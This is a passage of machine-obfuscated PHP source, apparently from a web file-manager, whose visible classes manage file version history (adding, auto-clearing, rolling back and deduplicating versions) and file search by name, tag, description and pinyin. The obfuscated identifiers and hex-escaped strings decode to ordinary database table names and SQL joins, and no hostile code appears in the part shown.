$_SERVER[¶Ô„œ…¯]; $¸ò¬“™ı = $ØÙÇìáË[$˜‘³™Â[447]]; $†Ìº«µ = array_to_keyvalue($¸ò¬“™ı, $˜‘³™Â[12], $˜‘³™Â[193]); $æğ²»‚í = array_to_keyvalue($¸ò¬“™ı, $˜‘³™Â[12], $˜‘³™Â[2214]); foreach ($¸ò¬“™ı as $¤Ì–Ø¼¢) { $ˆÔ¥ó«© = $¤Ì–Ø¼¢[$˜‘³™Â[528]]; if ($¤Ì–Ø¼¢[$˜‘³™Â[33]] == $˜‘³™Â[625] && isset($ˆÔ¥ó«©[$˜‘³™Â[1248]])) { $†Ìº«µ[] = $ˆÔ¥ó«©[$˜‘³™Â[1248]] . $˜‘³™Â[12]; $†Ìº«µ[] = $ˆÔ¥ó«©[$˜‘³™Â[1249]] . $˜‘³™Â[12]; } if ($¤Ì–Ø¼¢[$˜‘³™Â[33]] == $˜‘³™Â[2225] && isset($ˆÔ¥ó«©[$˜‘³™Â[193]])) { $†Ìº«µ[] = $ˆÔ¥ó«©[$˜‘³™Â[193]] . $˜‘³™Â[12]; } } $†Ìº«µ = array_merge($†Ìº«µ, $æğ²»‚í, array($ßÊ£¹ . $˜‘³™Â[12])); $†Ìº«µ = array_unique($†Ìº«µ); $ØèÀ–£Ü = array_unique(array_to_keyvalue($¸ò¬“™ı, $˜‘³™Â[12], $˜‘³™Â[1780])); $ÇÉØëªñ = Model($˜‘³™Â[599])->userListInfo($ØèÀ–£Ü); $ÑÌ›„”Š = Model($˜‘³™Â[903])->sourceListInfo($†Ìº«µ, !0); foreach ($¸ò¬“™ı as &$¤Ì–Ø¼¢) { if ($¤Ì–Ø¼¢[$˜‘³™Â[33]] == $˜‘³™Â[625] && isset($¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[1248]])) { $¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[1248]] = $ÑÌ›„”Š[$¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[1248]]]; $¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[1249]] = $ÑÌ›„”Š[$¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[1249]]]; } if ($¤Ì–Ø¼¢[$˜‘³™Â[33]] == $˜‘³™Â[2225] && isset($¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[193]])) { $¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[193]] = $ÑÌ›„”Š[$¤Ì–Ø¼¢[$˜‘³™Â[528]][$˜‘³™Â[193]]]; } $¤Ì–Ø¼¢[$˜‘³™Â[90]] = $ÑÌ›„”Š[$¤Ì–Ø¼¢[$˜‘³™Â[193]]]; $¤Ì–Ø¼¢[$˜‘³™Â[2230]] = $ÑÌ›„”Š[$¤Ì–Ø¼¢[$˜‘³™Â[2214]]]; if ($¤Ì–Ø¼¢[$˜‘³™Â[33]] == $˜‘³™Â[1948]) { $¤Ì–Ø¼¢[$˜‘³™Â[2230]] = $¤Ì–Ø¼¢[$˜‘³™Â[90]]; $¤Ì–Ø¼¢[$˜‘³™Â[2214]] = $¤Ì–Ø¼¢[$˜‘³™Â[2230]][$˜‘³™Â[193]]; $¤Ì–Ø¼¢[$˜‘³™Â[90]] = !1; $¤Ì–Ø¼¢[$˜‘³™Â[193]] = $˜‘³™Â[12]; } $¤Ì–Ø¼¢[$˜‘³™Â[2157]] = $ÇÉØëªñ[$¤Ì–Ø¼¢[$˜‘³™Â[1780]]]; } unset($¤Ì–Ø¼¢); $ØÙÇìáË[$˜‘³™Â[447]] = $¸ò¬“™ı; return $ØÙÇìáË; } public function removeBySource($¡ÃÊ™Ò«) { $ÁÊ¯Õ°Ó = array($_SERVER[¶Ô„œ…¯][493] => $¡ÃÊ™Ò«); $this->where($ÁÊ¯Õ°Ó)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\143\x65\137\x68\151\x73\x74\x6f\x72\x79"; public function historyCount($í•­ü¾í) { $ÊøĞİß× =& $_SERVER[¶Ô„œ…¯]; if (!$í•­ü¾í) { return array(); } if (is_string($í•­ü¾í) || is_int($í•­ü¾í)) { $í•­ü¾í = array($í•­ü¾í); } $§Ø°‘¢á = array($ÊøĞİß×[193], $ÊøĞİß×[2231] => $ÊøĞİß×[567]); $úİøŒò² = array($ÊøĞİß×[193] => array($ÊøĞİß×[7], $í•­ü¾í)); $¶øæ£¸¤ = $this->field($§Ø°‘¢á)->where($úİøŒò²)->group($ÊøĞİß×[193])->select(); return array_to_keyvalue($¶øæ£¸¤, $ÊøĞİß×[193], $ÊøĞİß×[567]); } public function addHistory($ª¶üòô, $¡ÚºŒÇ— = '') { $ÁÅ’•Á =& $_SERVER[¶Ô„œ…¯]; $Ì¾€ÇÕ± = array($ÁÅ’•Á[493] => $ª¶üòô[$ÁÅ’•Á[193]], $ÁÅ’•Á[1771] => isset($ª¶üòô[$ÁÅ’•Á[531]]) ? $ª¶üòô[$ÁÅ’•Á[531]] : $ª¶üòô[$ÁÅ’•Á[529]], $ÁÅ’•Á[544] => $ª¶üòô[$ÁÅ’•Á[543]], $ÁÅ’•Á[622] => $ª¶üòô[$ÁÅ’•Á[79]], $ÁÅ’•Á[2232] => $¡ÚºŒÇ—); if ($GLOBALS[$ÁÅ’•Á[6]][$ÁÅ’•Á[92]][$ÁÅ’•Á[1309]] >= 1) { $this->historyAutoClear($Ì¾€ÇÕ±[$ÁÅ’•Á[193]]); $this->add($Ì¾€ÇÕ±); } Hook::trigger($ÁÅ’•Á[2233], $Ì¾€ÇÕ±); Model($ÁÅ’•Á[2234])->eventFileEdit($ª¶üòô[$ÁÅ’•Á[193]]); } private function historyAutoClear($³³‹î€Ì) { $»Ñ½· =& $_SERVER[¶Ô„œ…¯]; $…¨ı¼í˜ = Model($»Ñ½·[848])->get($»Ñ½·[1331]); $íÜÆ³‘Ø = intval($GLOBALS[$»Ñ½·[6]][$»Ñ½·[92]][$»Ñ½·[1309]]); $š”ÅŠçâ = $…¨ı¼í˜ == $»Ñ½·[1332] ? min(5, $íÜÆ³‘Ø) : $íÜÆ³‘Ø; $š”ÅŠçâ = $š”ÅŠçâ <= 0 ? 0 : $š”ÅŠçâ - 1; if ($š”ÅŠçâ >= 499) { return; } $¼ã½ä‘Õ = array($»Ñ½·[493] => $³³‹î€Ì); $®†üíÉ€ = $this->field($»Ñ½·[2235])->where($¼ã½ä‘Õ)->order($»Ñ½·[2228])->select(); if (!$®†üíÉ€ || $š”ÅŠçâ >= count($®†üíÉ€)) { return; } $ÕáİÏ÷ = array_to_keyvalue($®†üíÉ€, $»Ñ½·[12], $»Ñ½·[477]); $ÕáİÏ÷ = array_slice($ÕáİÏ÷, $š”ÅŠçâ); $›ÜğŸ¬‹ = array_to_keyvalue($®†üíÉ€, $»Ñ½·[12], $»Ñ½·[543]); $›ÜğŸ¬‹ = array_slice($›ÜğŸ¬‹, $š”ÅŠçâ); if (!$ÕáİÏ÷ || !$›ÜğŸ¬‹) { return; } $¼ã½ä‘Õ = array($»Ñ½·[495] => array($»Ñ½·[7], $ÕáİÏ÷)); $this->where($¼ã½ä‘Õ)->delete(); Model($»Ñ½·[546])->remove($›ÜğŸ¬‹); } public function listData($î‹Û¨Ö„) { $´àÚ°‰Ÿ =& $_SERVER[¶Ô„œ…¯]; $òºÅâ° = array($´àÚ°‰Ÿ[493] => $î‹Û¨Ö„); $ĞÕÕÃù = $´àÚ°‰Ÿ[2236]; $µ…šÄù = $this->field($ĞÕÕÃù)->where($òºÅâ°)->order($´àÚ°‰Ÿ[2228])->selectPage(); $this->_listAppendUser($µ…šÄù[$´àÚ°‰Ÿ[447]]); $¡¨à¼Ú“ = Model($´àÚ°‰Ÿ[848])->get($´àÚ°‰Ÿ[1331]); $Îğ¾É· = 5; if ($¡¨à¼Ú“ == $´àÚ°‰Ÿ[1332]) { $µ…šÄù[$´àÚ°‰Ÿ[447]] = array_slice($µ…šÄù[$´àÚ°‰Ÿ[447]], 0, $Îğ¾É·); $µ…šÄù[$´àÚ°‰Ÿ[444]] = array($´àÚ°‰Ÿ[2237] => 1, $´àÚ°‰Ÿ[2238] => 20, $´àÚ°‰Ÿ[2239] => 1, $´àÚ°‰Ÿ[2240] => count($µ…šÄù[$´àÚ°‰Ÿ[447]])); } return $µ…šÄù; } protected function _listAppendUser(&$¢°ãš«) { $ö™îÍÂê =& $_SERVER[¶Ô„œ…¯]; $Ô¹•§ùÃ = array_to_keyvalue($¢°ãš«, $ö™îÍÂê[12], $ö™îÍÂê[1780]); $Ú†”ËÃÉ = Model($ö™îÍÂê[599])->userListInfo($Ô¹•§ùÃ); foreach ($¢°ãš« as &$ö¤®Œ±) { $ƒ˜ÚÄ¢À = $ö¤®Œ±[$ö™îÍÂê[1780]]; $ö¤®Œ±[$ö™îÍÂê[529]] = $Ú†”ËÃÉ[$ƒ˜ÚÄ¢À] ? $Ú†”ËÃÉ[$ƒ˜ÚÄ¢À] : !1; } unset($ö¤®Œ±); } public function fileInfo($·½¥™ƒ) { $œòªùÙ¿ =& $_SERVER[¶Ô„œ…¯]; $ó†ß•’Ë = $this->tablePrefix; $Æ¿„èöÕ = "{$ó†ß•’Ë}\x69\x6f\137\x66\x69\154\x65\x20\146\x69\154\145\163\40\157\x6e\40\x66\151\x6c\x65\163\56\x66\151\x6c\145\111\104\40\x3d\40\x68\151\x73\164\x6f\162\x79\56\146\151\x6c\145\111\x44"; return $this->alias($œòªùÙ¿[2241])->where(array($œòªùÙ¿[495] => $·½¥™ƒ))->join($Æ¿„èöÕ, $œòªùÙ¿[2242])->find(); } public function removeItem($‚‰«À¼) { $ĞûŞ“ =& $_SERVER[¶Ô„œ…¯]; $Æ°õıÈ = array($ĞûŞ“[495] => $‚‰«À¼); $ò­ö÷´Ô = $this->where($Æ°õıÈ)->find(); if ($ò­ö÷´Ô) { $Ø¶ØÑ¼ò = $this->where($Æ°õıÈ)->delete(); Model($ĞûŞ“[546])->remove($ò­ö÷´Ô[$ĞûŞ“[543]]); return $Ø¶ØÑ¼ò; } return !1; } public function removeBySource($öÔ˜İÏä) { $°™¥§ò =& $_SERVER[¶Ô„œ…¯]; if (!$öÔ˜İÏä) { return !1; } if (!is_array($öÔ˜İÏä)) { $öÔ˜İÏä = array($öÔ˜İÏä); } $ªØ¦ÊÈñ = array($°™¥§ò[493] => array($°™¥§ò[7], $öÔ˜İÏä)); $ÜËÅĞù = $this->field($°™¥§ò[544])->where($ªØ¦ÊÈñ)->select(); if ($ÜËÅĞù) { $this->where($ªØ¦ÊÈñ)->delete(); $Ş¿»Í·à = array_to_keyvalue($ÜËÅĞù, $°™¥§ò[12], $°™¥§ò[543]); Model($°™¥§ò[546])->remove($Ş¿»Í·à); } return !0; } public function setDetail($úğû¼Ä , $Í—€„’Ù) { $ø–÷§Ó =& $_SERVER[¶Ô„œ…¯]; return $this->where(array($ø–÷§Ó[495] => $úğû¼Ä ))->save(array($ø–÷§Ó[2232] => $Í—€„’Ù)); } public function rollbackToItem($ÆØ†ÜØ‘, $áëğ’Îç) { $À­ã¦æ =& $_SERVER[¶Ô„œ…¯]; $óƒš’› = Model($À­ã¦æ[903])->sourceInfo($ÆØ†ÜØ‘); $this->addHistory($óƒš’›, LNG($À­ã¦æ[2243])); $î³¶•¡Û = $this->find($áëğ’Îç); $„ğº¹¾ = array($À­ã¦æ[543] => $î³¶•¡Û[$À­ã¦æ[543]], $À­ã¦æ[79] => $î³¶•¡Û[$À­ã¦æ[79]], $À­ã¦æ[88] => time(), $À­ã¦æ[531] => USER_ID); Model($À­ã¦æ[903])->where(array($À­ã¦æ[193] => $ÆØ†ÜØ‘))->save($„ğº¹¾); return $this->where(array($À­ã¦æ[495] => $áëğ’Îç))->delete(); } public function clearSame($ÈˆÚÌÇ’) { $âƒÏéìå =& $_SERVER[¶Ô„œ…¯]; $€»¶æŒ = $this->listData($ÈˆÚÌÇ’); $üÓôòú = array_to_keyvalue_group($€»¶æŒ, $âƒÏéìå[543]); $÷î• = array(); $õè—íá© = array(); foreach ($üÓôòú as $¤’Ûµ¯ö) { if (!$¤’Ûµ¯ö || count($¤’Ûµ¯ö) <= 1) { continue; } foreach ($¤’Ûµ¯ö as $”‰¼Ã¹Ç) { $÷î•[] = $”‰¼Ã¹Ç[$âƒÏéìå[543]]; $õè—íá©[] = $”‰¼Ã¹Ç[$âƒÏéìå[477]]; } } if (!$õè—íá©) { return; } $this->where(array($âƒÏéìå[477] => array($âƒÏéìå[7], $õè—íá©)))->delete(); Model($âƒÏéìå[546])->remove($÷î•); } public function userSpace() { $ªİêŒªÌ =& $_SERVER[¶Ô„œ…¯]; $¯İë¤î… = $this->tablePrefix; $¬éÖ¡®Ã = array($ªİêŒªÌ[1771] => USER_ID); $¾³¬½ñ¦ = "{$¯İë¤î…}\151\157\137\x66\x69\x6c\145\40\146\x69\154\x65\163\40\157\156\40\x66\151\x6c\145\163\56\x66\151\154\145\x49\104\40\x3d\40\150\x69\163\x74\x6f\162\171\56\146\151\154\x65\x49\x44"; return $this->alias($ªİêŒªÌ[2241])->where($¬éÖ¡®Ã)->join($¾³¬½ñ¦, $ªİêŒªÌ[2242])->sum($ªİêŒªÌ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($óİĞ–Šü) { $•¢×ìûŒ =& $_SERVER[¶Ô„œ…¯]; $‹€ö„¶Ş = KodIO::fileTypeList(); $ïàÂÎ“Æ = $‹€ö„¶Ş[$óİĞ–Šü]; if (!$ïàÂÎ“Æ) { return array(); } $ºÊÈÚ = $ïàÂÎ“Æ[$•¢×ìûŒ[169]]; $åò“²Ë = $•¢×ìûŒ[7]; if (!$ïàÂÎ“Æ[$•¢×ìûŒ[169]]) { $ˆşìúğ¯ = array_to_keyvalue($‹€ö„¶Ş, $•¢×ìûŒ[12], $•¢×ìûŒ[169]); $ºÊÈÚ = implode($•¢×ìûŒ[50], $ˆşìúğ¯); $åò“²Ë = $•¢×ìûŒ[2244]; } $²¿äö¤í = explode($•¢×ìûŒ[50], trim($ºÊÈÚ, $•¢×ìûŒ[50])); return array($åò“²Ë, $²¿äö¤í); } public function listPathType($üø¦ä‹¥) { $€ïµ‹¹ƒ =& $_SERVER[¶Ô„œ…¯]; $â¬¸–ä¡ = $this->fileTypeWhere($üø¦ä‹¥); if (!$â¬¸–ä¡) { return array(); } $®£ºõ†½ = USER_ID; $Óñ·íº« = Model($€ïµ‹¹ƒ[599])->getInfo($®£ºõ†½); $µÊşÈ—Õ = array($€ïµ‹¹ƒ[653] => SourceModel::TYPE_USER, $€ïµ‹¹ƒ[586] => array($€ïµ‹¹ƒ[617], $€ïµ‹¹ƒ[595] . $Óñ·íº«[$€ïµ‹¹ƒ[90]][$€ïµ‹¹ƒ[193]] . $€ïµ‹¹ƒ[618]), $€ïµ‹¹ƒ[654] => $®£ºõ†½, $€ïµ‹¹ƒ[651] => 0, $€ïµ‹¹ƒ[652] => $â¬¸–ä¡); return $this->listSource($µÊşÈ—Õ); } public function listSearch($üƒëºâÍ, $¯œÀ˜£¾ = 300) { $€ıøÙõß =& $_SERVER[¶Ô„œ…¯]; if (isset($üƒëºâÍ[$€ıøÙõß[2078]]) && $üƒëºâÍ[$€ıøÙõß[2078]]) { $üƒëºâÍ[$€ıøÙõß[2078]] = str_replace($€ıøÙõß[462], $€ıøÙõß[2245], trim($üƒëºâÍ[$€ıøÙõß[2078]])); } $ö›ÊšÙ = $this->_parseSearchWhere($üƒëºâÍ); if (!isset($ö›ÊšÙ[$€ıøÙõß[507]])) { $ö›ÊšÙ[$€ıøÙõß[507]] = 0; } $«™äíÓç = $€ıøÙõß[2246]; $äî³€Ò = $ö›ÊšÙ; $¢ÀÊèîë = $«™äíÓç; $this->_listSearchBindPinyin($üƒëºâÍ, $ö›ÊšÙ, $«™äíÓç); $this->alias($€ıøÙõß[521])->_makeOrder(); $ö›ÊšÙ = $this->parseWhereLike($ö›ÊšÙ); $ˆÉÓ’¬ = $this->distinct(!0)->field($«™äíÓç)->where($ö›ÊšÙ)->selectPage($¯œÀ˜£¾); if ($GLOBALS[$€ıøÙõß[6]][$€ıøÙõß[459]][$€ıøÙõß[460]] && Input::check($üƒëºâÍ[$€ıøÙõß[2078]], $€ıøÙõß[660]) && $ˆÉÓ’¬[$€ıøÙõß[444]][$€ıøÙõß[430]] == 1 && $ˆÉÓ’¬[$€ıøÙõß[444]][$€ıøÙõß[445]] == 0) { $ˆÉÓ’¬ = $this->distinct(!0)->field($«™äíÓç)->where($äî³€Ò)->limit(1000)->select(); $ˆÉÓ’¬ = array_page_split($ˆÉÓ’¬, !1, $¯œÀ˜£¾); } $this->_listSearchFileContent($ˆÉÓ’¬, $üƒëºâÍ, $¢ÀÊèîë, $äî³€Ò); $this->_listSearchDesc($ˆÉÓ’¬, $üƒëºâÍ, $¢ÀÊèîë); $this->_listSearchTag($ˆÉÓ’¬, $üƒëºâÍ, $¢ÀÊèîë); $this->_listSearchGroupTag($ˆÉÓ’¬, $üƒëºâÍ, $¢ÀÊèîë); $this->_listDataApply($ˆÉÓ’¬[$€ıøÙõß[447]]); $this->_listMake($ˆÉÓ’¬); return $ˆÉÓ’¬; } private function _listSearchFileContent(&$ì“Ş³¿£, $õÒéí«¼, $°½¯™øŸ, $¨í˜Ş²) { $ˆ¨Ìì¯Ì =& $_SERVER[¶Ô„œ…¯]; if (!$õÒéí«¼[$ˆ¨Ìì¯Ì[2078]] || $ì“Ş³¿£[$ˆ¨Ìì¯Ì[444]][$ˆ¨Ìì¯Ì[430]] > 1) { return; } if (!isset($¨í˜Ş²[$ˆ¨Ìì¯Ì[32]]) || !is_array($õÒéí«¼[$ˆ¨Ìì¯Ì[543]])) { return; } $¨í˜Ş²[$ˆ¨Ìì¯Ì[543]] = array($ˆ¨Ìì¯Ì[7], $õÒéí«¼[$ˆ¨Ìì¯Ì[543]]); unset($¨í˜Ş²[$ˆ¨Ìì¯Ì[32]]); unset($õÒéí«¼[$ˆ¨Ìì¯Ì[543]]); $Á®ÒİÕ² = $this->field($°½¯™øŸ)->where($¨í˜Ş²)->limit($ˆ¨Ìì¯Ì[2247])->select(); if (!$Á®ÒİÕ² || count($Á®ÒİÕ²) == 0) { return; } $ì“Ş³¿£[$ˆ¨Ìì¯Ì[447]] = array_merge($Á®ÒİÕ², $ì“Ş³¿£[$ˆ¨Ìì¯Ì[447]]); $ì“Ş³¿£[$ˆ¨Ìì¯Ì[444]][$ˆ¨Ìì¯Ì[445]] += count($Á®ÒİÕ²); } private function _listSearchTag(&$“àü²‚¡, $“ÅÄŸ°ï, $Úß¨¦–‡) { $ôâ°ßïã =& $_SERVER[¶Ô„œ…¯]; if (!$“ÅÄŸ°ï[$ôâ°ßïã[2078]] || $“àü²‚¡[$ôâ°ßïã[444]][$ôâ°ßïã[430]] > 1) { return; } $ÄÆ˜İ¿Ù = Model($ôâ°ßïã[2248])->listData(); $ÅÎÀÚî = array(); $ª¢¦ŒÌÖ = $“ÅÄŸ°ï[$ôâ°ßïã[2078]]; foreach ($ÄÆ˜İ¿Ù as $Ë‚Õ±è) { $€¯àìï = $Ë‚Õ±è[$ôâ°ßïã[32]]; $‰æ”Öç‰ = str_replace($ôâ°ßïã[53], $ôâ°ßïã[12], Pinyin::get($€¯àìï)); if (stripos($€¯àìï, $ª¢¦ŒÌÖ) !== !1 || stripos($‰æ”Öç‰, $ª¢¦ŒÌÖ) !== !1) { $ÅÎÀÚî[] = $Ë‚Õ±è[$ôâ°ßïã[477]]; } } if (!$ÅÎÀÚî) { return; } $‹¡ûÊòä = array($ôâ°ßïã[502] => array($ôâ°ßïã[7], $ÅÎÀÚî), $ôâ°ßïã[1780] => USER_ID); $ÔáÊôšÆ = Model($ôâ°ßïã[504])->field($ôâ°ßïã[87])->where($‹¡ûÊòä)->select(); $ÔáÊôšÆ = array_to_keyvalue($ÔáÊôšÆ, $ôâ°ßïã[12], $ôâ°ßïã[87]); $€ÂÊ…ç = array_unique($ÔáÊôšÆ); $this->_listSearchMerge($“àü²‚¡, $“ÅÄŸ°ï, $Úß¨¦–‡, $€ÂÊ…ç); } private function _listSearchDesc(&$•øÜ ¹ö, $²Ş£ºË¬, $àıœÖ«š) { $ãÑ·ÜÆ =& $_SERVER[¶Ô„œ…¯]; if (!$²Ş£ºË¬[$ãÑ·ÜÆ[2078]] || $•øÜ ¹ö[$ãÑ·ÜÆ[444]][$ãÑ·ÜÆ[430]] > 1) { return; } $è±ÚŞˆÅ = array($ãÑ·ÜÆ[97] => $ãÑ·ÜÆ[528], $ãÑ·ÜÆ[452] => array($ãÑ·ÜÆ[461], $ãÑ·ÜÆ[2080] . $²Ş£ºË¬[$ãÑ·ÜÆ[2078]] . $ãÑ·ÜÆ[2080])); $ˆ¿Ùì©ã = !1; if ($ˆ¿Ùì©ã) { $ğš·§øº = $this->listSearchChildren($²Ş£ºË¬[$ãÑ·ÜÆ[192]]); $ğš·§øº = array_unique($ğš·§øº); if (!$ğš·§øº) { return; } $è±ÚŞˆÅ[$ãÑ·ÜÆ[193]] = array($ãÑ·ÜÆ[7], $ğš·§øº); } $Ø™ÛØİ¢ = Model($ãÑ·ÜÆ[637])->field($ãÑ·ÜÆ[193])->where($è±ÚŞˆÅ)->limit(5000)->select(); $È²¦’· = array_to_keyvalue($Ø™ÛØİ¢, $ãÑ·ÜÆ[12], $ãÑ·ÜÆ[193]); $this->_listSearchMerge($•øÜ ¹ö, $²Ş£ºË¬, $àıœÖ«š, $È²¦’·); } private function _listSearchGroupTag(&$¨õ·³õ, $Ï”Çìá, $ÓõóíÄú) { $Æª´„  =& $_SERVER[¶Ô„œ…¯]; if (!$Ï”Çìá[$Æª´„ [2078]] || $¨õ·³õ[$Æª´„ [444]][$Æª´„ [430]] > 1 || !$Ï”Çìá[$Æª´„ [192]]) { return; } $ù÷ü©çñ = $this->sourceInfo($Ï”Çìá[$Æª´„ [192]]); if (!$ù÷ü©çñ || $ù÷ü©çñ[$Æª´„ [190]] != SourceModel::TYPE_GROUP) { return; } $ ÂÅ¾âá = $ù÷ü©çñ[$Æª´„ [571]]; $±éò³é‡ = Model($Æª´„ [2249])->get($ ÂÅ¾âá); $•‡û˜’¢ = array(); $ø‹‘î¥  = $Ï”Çìá[$Æª´„ [2078]]; foreach ($±éò³é‡[$Æª´„ [447]] as $Æí½Ø×£) { $Ú¦—æ÷‹ = $Æí½Ø×£[$Æª´„ [32]]; $ÇÅÃæô› = str_replace($Æª´„ [53], $Æª´„ [12], Pinyin::get($Ú¦—æ÷‹)); if (stripos($Ú¦—æ÷‹, $ø‹‘î¥ ) !== !1 || stripos($ÇÅÃæô›, $ø‹‘î¥ ) !== !1) { $•‡û˜’¢[] = $Æí½Ø×£[$Æª´„ [477]]; } } if (!$•‡û˜’¢) { return; } $ùø¼×Ğ = array($Æª´„ [502] => array($Æª´„ [7], $•‡û˜’¢), $Æª´„ [1780] => 0, $Æª´„ [33] => $Æª´„ [2100] . $ ÂÅ¾âá); $Ï×êÉêÛ = Model($Æª´„ [504])->field($Æª´„ [87])->where($ùø¼×Ğ)->select(); $Ï×êÉêÛ = array_to_keyvalue($Ï×êÉêÛ, $Æª´„ [12], $Æª´„ [87]); $Ù¼ßÈŠ— = array_unique($Ï×êÉêÛ); $this->_listSearchMerge($¨õ·³õ, $Ï”Çìá, $ÓõóíÄú, $Ù¼ßÈŠ—); } private function _listSearchMerge(&$Ëêş«’à, $İ¾ò§êÂ, $Š®íã‘, $–ğü££) { $ç¾Á…Â =& $_SERVER[¶Ô„œ…¯]; if (!$–ğü££) { return; } $¬‚ö€Í‘ = array_to_keyvalue($Ëêş«’à[$ç¾Á…Â[447]], $ç¾Á…Â[12], $ç¾Á…Â[193]); $«Ä³×ù = array_diff($–ğü££, $¬‚ö€Í‘); if (!$«Ä³×ù) { return; } $ğ¬Àå’Ä = array($ç¾Á…Â[193] => array($ç¾Á…Â[7], $«Ä³×ù)); $»‚‚Í§Ğ = $this->field($Š®íã‘)->where($ğ¬Àå’Ä)->select(); if (!$»‚‚Í§Ğ) { return; } $ì‚™²‰ = array(); foreach ($»‚‚Í§Ğ as $Ê„ø¶Ã§) { if ($this->_listSearchFilter($Ê„ø¶Ã§, $İ¾ò§êÂ)) { $ì‚™²‰[] = $Ê„ø¶Ã§; } } $Ëêş«’à[$ç¾Á…Â[447]] = array_merge($ì‚™²‰, $Ëêş«’à[$ç¾Á…Â[447]]); $Ëêş«’à[$ç¾Á…Â[444]][$ç¾Á…Â[445]] += count($ì‚™²‰); } private function _listSearchFilter($§Ï¶Öœ—, $­±„œ) { $ÖšÈ„«ğ =& $_SERVER[¶Ô„œ…¯]; $’–•‘Ë¯ = $§Ï¶Öœ—[$ÖšÈ„«ğ[487]] == $ÖšÈ„«ğ[91]; if (!strstr($§Ï¶Öœ—[$ÖšÈ„«ğ[586]], $ÖšÈ„«ğ[50] . $­±„œ[$ÖšÈ„«ğ[192]] . $ÖšÈ„«ğ[50])) { return !1; } if (isset($­±„œ[$ÖšÈ„«ğ[488]]) && $­±„œ[$ÖšÈ„«ğ[488]] != $ÖšÈ„«ğ[854]) { if ($­±„œ[$ÖšÈ„«ğ[488]] == $ÖšÈ„«ğ[78] && !$’–•‘Ë¯) { return !1; } if ($­±„œ[$ÖšÈ„«ğ[488]] != $ÖšÈ„«ğ[78] && $’–•‘Ë¯) { return !1; } if (!strstr($§Ï¶Öœ—[$ÖšÈ„«ğ[169]], $ÖšÈ„«ğ[50] . $­±„œ[$ÖšÈ„«ğ[488]] . $ÖšÈ„«ğ[50])) { return !1; } } if (isset($­±„œ[$ÖšÈ„«ğ[2250]]) && $­±„œ[$ÖšÈ„«ğ[2250]] < $§Ï¶Öœ—[$ÖšÈ„«ğ[79]]) { return !1; } if (isset($­±„œ[$ÖšÈ„«ğ[2251]]) && $­±„œ[$ÖšÈ„«ğ[2251]] > $§Ï¶Öœ—[$ÖšÈ„«ğ[79]]) { return !1; } if (isset($­±„œ[$ÖšÈ„«ğ[667]]) && $­±„œ[$ÖšÈ„«ğ[667]] != $§Ï¶Öœ—[$ÖšÈ„«ğ[531]]) { return !1; } return !0; } public function listSearchChildren($ºë¥ĞÕ¬, $ºÏñÍÑ = 5000) { $¶”­µ®± =& $_SERVER[¶Ô„œ…¯]; $™”™Ì™‚ = array(); $“óÓåÌÖ = $this->sourceInfo($ºë¥ĞÕ¬); $Ü‘”ôœ¸ = array($¶”­µ®±[586] => array($¶”­µ®±[461], $“óÓåÌÖ[$¶”­µ®±[586]] . $“óÓåÌÖ[$¶”­µ®±[193]] . $¶”­µ®±[618])); $©ı²ô™Ì = $this->field($¶”­µ®±[79])->where($Ü‘”ôœ¸)->limit($ºÏñÍÑ + 1)->select(); $İÅäˆç‘ = is_array($©ı²ô™Ì) ? count($©ı²ô™Ì) : 0; if ($İÅäˆç‘ > $ºÏñÍÑ) { return $this->_listSearchChildrenNear($ºë¥ĞÕ¬, $ºÏñÍÑ); } $¤Éœ…Ÿ = $this->field($¶”­µ®±[193])->where($Ü‘”ôœ¸)->select(); $™”™Ì™‚ = array_to_keyvalue($¤Éœ…Ÿ, $¶”­µ®±[12], $¶”­µ®±[193]); return $™”™Ì™‚; } private function _listSearchChildrenNear($“Õ°Ä²µ, $çªÜµí¹) { $¯×İÖÃ¾ =& $_SERVER[¶Ô„œ…¯]; $çåÛä™… = array(); $İ¹ÛÙ»£ = array($¯×İÖÃ¾[192] => $“Õ°Ä²µ); $óâŒŒûï = $this->field($¯×İÖÃ¾[2252])->where($İ¹ÛÙ»£)->select(); $úáÒ¿ = array_to_keyvalue(array_filter_by_field($óâŒŒûï, $¯×İÖÃ¾[487], $¯×İÖÃ¾[91]), $¯×İÖÃ¾[12], $¯×İÖÃ¾[193]); $çåÛä™… = array_merge($çåÛä™…, array_to_keyvalue($óâŒŒûï, $¯×İÖÃ¾[12], $¯×İÖÃ¾[193])); if (!$úáÒ¿) { return $çåÛä™…; } $İ¹ÛÙ»£ = array($¯×İÖÃ¾[192] => array($¯×İÖÃ¾[7], $úáÒ¿)); $óâŒŒûï = $this->field($¯×İÖÃ¾[2252])->where($İ¹ÛÙ»£)->limit($çªÜµí¹)->select(); $çåÛä™… = array_merge($çåÛä™…, array_to_keyvalue($óâŒŒûï, $¯×İÖÃ¾[12], $¯×İÖÃ¾[193])); $çåÛä™… = array_slice($çåÛä™…, 0, intval($çªÜµí¹)); return $çåÛä™…; } private function _listSearchBindPinyin($«ª†àö‹, &$õ·«Ï², &$Ã”ºõ ı) { $È†•ÑÓ =& $_SERVER[¶Ô„œ…¯]; if (!isset($«ª†àö‹[$È†•ÑÓ[2078]]) || !$«ª†àö‹[$È†•ÑÓ[2078]]) { return; } if (!Input::check($«ª†àö‹[$È†•ÑÓ[2078]], $È†•ÑÓ[395]) || strlen($«ª†àö‹[$È†•ÑÓ[2078]]) < 2) { return; } $ñ’‡¤À = "\114\105\106\124\40\x4a\117\x49\116\40{$this->tablePrefix}\x69\x6f\x5f\163\157\165\162\143\145\137\x6d\x65\x74\141\40\155\x65\164\x61\40\x6f\156\40\x73\x6f\165\x72\x63\x65\x2e\163\157\x75\162\143\145\111\x44\40\x3d\x20\155\145\x74\141\x2e\x73\x6f\165\x72\x63\145\x49\x44"; $Â™øø¼õ = array(); $Ã”ºõ ı = str_replace(array($È†•ÑÓ[287], $È†•ÑÓ[53], $È†•ÑÓ[2253]), $È†•ÑÓ[12], $Ã”ºõ ı); $Ã”ºõ ı = $È†•ÑÓ[513] . str_replace($È†•ÑÓ[50], $È†•ÑÓ[514], $Ã”ºõ ı); $¯ó½°Î = 